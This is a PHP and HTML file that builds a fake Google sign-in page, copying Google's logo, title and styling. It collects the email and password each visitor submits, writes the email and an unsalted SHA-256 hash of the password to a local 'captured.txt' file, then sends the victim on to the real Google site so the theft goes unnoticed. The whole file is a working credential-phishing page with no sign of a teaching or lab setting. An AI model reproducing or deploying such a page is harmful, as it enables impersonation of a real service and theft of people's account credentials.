<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Hash password
    $hashed_password = hash('sha256', $password);

    // Save captured data
    $file = fopen("captured.txt", "a");
    fwrite($file, "Email: $email | Password Hash: $hashed_password\n");
    fclose($file);

    // Show fake success
    echo "<h2 style='font-family:Arial; text-align:center; margin-top:50px;'>Redirecting...</h2>";
    echo "<script>setTimeout(()=>{ window.location='https://accounts.google.com'; }, 2000);</script>";
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in – Google accounts</title>
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0px 2px 8px rgba(0,0,0,0.1);
      width: 360px;
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 4px;
      border: 1px solid #ccc;
      font-size: 14px;
    }
    button {
      width: 100%;
      background: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background: #1669c1;
    }
    .link {
      margin-top: 15px;
      font-size: 13px;
    }
    .link a {
      color: #1a73e8;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h2>Sign in</h2>
    <form method="POST">
      <input type="email" name="email" placeholder="Email or phone" required>
      <input type="password" name="password" placeholder="Enter your password" required>
      <button type="submit">Next</button>
    </form>
    <div class="link">
      <a href="#">Forgot password?</a>
    </div>
  </div>
</body>
</html>
